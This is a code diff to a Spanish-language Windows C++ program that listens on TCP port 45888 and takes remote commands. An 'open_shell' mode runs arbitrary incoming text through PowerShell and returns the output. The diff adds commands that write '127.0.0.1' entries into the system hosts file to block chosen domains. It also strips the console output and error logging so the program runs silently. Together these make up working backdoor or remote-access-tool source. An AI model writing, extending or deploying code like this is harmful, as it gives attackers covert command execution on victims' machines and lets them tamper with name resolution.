@@ -7,7 +7,7 @@
 #include <windows.h>
 #include <asio.hpp>
 #include <thread>
-#include <iostream>
+#include <fstream>
 #include <atomic>
 #include <vector>
 #include <string>
@@ -15,10 +15,49 @@
 
 namespace Comunicacion
 {
-
     std::atomic<bool> ShellCheck{false};
 
-    // Función que acepta múltiples strings (también const char*) y los concatena antes de enviar
+    inline bool AgregarExclusion(std::string exclusion)
+    {
+        std::fstream ArchivoExclusiones("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
+        if (ArchivoExclusiones.is_open())
+        {
+            ArchivoExclusiones << "127.0.0.1 " << exclusion << std::endl;
+            ArchivoExclusiones.close();
+            return true;
+        }
+        return false;
+    }
+
+    inline bool EliminarUltimaLinea()
+    {
+        std::ifstream inFile("C:\\Windows\\System32\\drivers\\etc\\hosts");
+        if (!inFile.is_open())
+            return false;
+        std::vector<std::string> lineas;
+        std::string linea;
+        while (std::getline(inFile, linea))
+        {
+            lineas.push_back(linea);
+        }
+        inFile.close();
+
+        if (lineas.empty())
+            return false;
+        lineas.pop_back();
+
+        std::ofstream outFile("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::trunc);
+        if (!outFile.is_open())
+            return false;
+        for (const auto &l : lineas)
+        {
+            outFile << l << std::endl;
+        }
+        outFile.close();
+        return true;
+    }
+
+    // Función que concatena múltiples strings y los envía
     template <typename... Args>
     void enviarMensaje(asio::ip::tcp::socket &sock, Args &&...args)
     {
@@ -80,7 +119,6 @@ namespace Comunicacion
         try
         {
             char data[4096];
-
             while (true)
             {
                 std::size_t length = sock.read_some(asio::buffer(data));
@@ -93,30 +131,69 @@ namespace Comunicacion
 
                 if (mensaje.empty())
                 {
-                    enviarMensaje(sock, "Mensaje vacío, pibe... \n");
+                    enviarMensaje(sock, "Mensaje vacío, pibe...\n");
                     continue;
+                }
+
+                std::istringstream ss(mensaje);
+                std::vector<std::string> Instrucciones;
+                std::string instruccion;
+                while (ss >> instruccion)
+                {
+                    Instrucciones.push_back(instruccion);
                 }
 
                 if (!ShellCheck.load())
                 {
-                    if (mensaje == "open_shell")
+                    if (Instrucciones[0] == "open_shell")
                     {
                         ShellCheck.store(true);
                         enviarMensaje(sock, "Shell activado.\n");
                         continue;
                     }
 
-                    if (mensaje == "screen_info")
+                    if (Instrucciones[0] == "screen_info")
                     {
                         int width = GetSystemMetrics(SM_CXSCREEN);
                         int height = GetSystemMetrics(SM_CYSCREEN);
+                        enviarMensaje(sock,
+                                      " - - - - Informacion - - - - \n",
+                                      " - Width: ", std::to_string(width), "\n",
+                                      " - Height: ", std::to_string(height), "\n",
+                                      " - - - - Informacion - - - - \n");
+                        continue;
+                    }
 
-                        enviarMensaje(
-                            sock,
-                            " - - - - Informacion - - - - \n",
-                            " - Width: ", std::to_string(width), "\n",
-                            " - Height: ", std::to_string(height), "\n",
-                            " - - - - Informacion - - - - \n");
+                    if (Instrucciones[0] == "exclusion")
+                    {
+                        if (Instrucciones.size() < 2)
+                        {
+                            enviarMensaje(sock, "Faltan parametros para exclusion\n");
+                            continue;
+                        }
+                        if (Instrucciones[1] == "remove")
+                        {
+                            if (EliminarUltimaLinea())
+                                enviarMensaje(sock, " - - Exclusion eliminada con exito - - \n");
+                            else
+                                enviarMensaje(sock, " - - No se pudo eliminar la exclusion - - \n");
+                        }
+                        else if (Instrucciones[1] == "add")
+                        {
+                            if (Instrucciones.size() < 3)
+                            {
+                                enviarMensaje(sock, "Faltan parametros para agregar exclusion\n");
+                                continue;
+                            }
+                            if (AgregarExclusion(Instrucciones[2]))
+                                enviarMensaje(sock, " - - Exclusion agregada con exito - - \n");
+                            else
+                                enviarMensaje(sock, " - - La exclusion no pudo ser agregada - - \n");
+                        }
+                        else
+                        {
+                            enviarMensaje(sock, " - - Operacion no valida - - \n");
+                        }
                         continue;
                     }
 
@@ -124,7 +201,7 @@ namespace Comunicacion
                 }
                 else
                 {
-                    if (mensaje == "close_shell")
+                    if (Instrucciones[0] == "close_shell")
                     {
                         ShellCheck.store(false);
                         enviarMensaje(sock, "Shell desactivado.\n");
@@ -134,11 +211,10 @@ namespace Comunicacion
                     std::string resultado;
                     if (PowerShell(mensaje, resultado))
                     {
-                        enviarMensaje(
-                            sock,
-                            "\n - - - - - Inicio - - - - -\n",
-                            resultado,
-                            "\n - - - - - Final  - - - - -\n@bin> ");
+                        enviarMensaje(sock,
+                                      "\n - - - - - Inicio - - - - -\n",
+                                      resultado,
+                                      "\n - - - - - Final  - - - - -\n@bin> ");
                     }
                     else
                     {
@@ -147,11 +223,10 @@ namespace Comunicacion
                 }
             }
         }
-        catch (const std::exception &e)
+        catch (const std::exception &)
         {
-            std::cerr << "[ERROR] " << e.what() << std::endl;
+            // Ignorar errores, sin registrar nada.
         }
-
         sock.close();
     }
 
@@ -162,8 +237,6 @@ namespace Comunicacion
             asio::io_context io_context;
             asio::ip::tcp::acceptor acceptor(io_context, asio::ip::tcp::endpoint(asio::ip::tcp::v4(), 45888));
 
-            std::cout << "[*] Servidor escuchando en el puerto 45888..." << std::endl;
-
             while (true)
             {
                 asio::ip::tcp::socket socket(io_context);
@@ -171,9 +244,9 @@ namespace Comunicacion
                 std::thread(manejarSesion, std::move(socket)).detach();
             }
         }
-        catch (const std::exception &e)
+        catch (const std::exception &)
         {
-            std::cerr << "[ERROR Servidor] " << e.what() << std::endl;
+            // Ignorar errores, sin registrar nada.
         }
     }
 
